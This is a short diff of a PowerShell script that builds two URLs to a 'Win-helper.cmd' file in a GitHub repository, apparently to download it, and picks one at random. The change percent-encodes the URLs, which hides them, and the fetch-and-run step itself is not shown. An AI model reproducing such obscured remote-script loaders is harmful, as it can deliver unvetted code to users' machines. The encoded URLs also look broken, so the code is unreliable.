@@ -4,8 +4,8 @@ $ErrorActionPreference = "Stop"
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
 $CommonURLPart = 'Win-helper.cmd'
-$DownloadURL1 = 'https://raw.githubusercontent.com/BL4ckCloud/abahzian/main/win' + $CommonURLPart
-$DownloadURL2 = 'https://raw.githubusercontent.com/BL4ckCloud/abahzian/main/win' + $CommonURLPart
+$DownloadURL1 = 'https%3A%2F%2Fraw.githubusercontent.com%2FBL4ckCloud%2Fabahzian%2Fmain%2F' + $CommonURLPart
+$DownloadURL2 = 'https%3A%2F%2Fraw.githubusercontent.com%2FBL4ckCloud%2Fabahzian%2Fmain%2F' + $CommonURLPart
 
 $URLs = @($DownloadURL1, $DownloadURL2)
 $RandomURL1 = Get-Random -InputObject $URLs
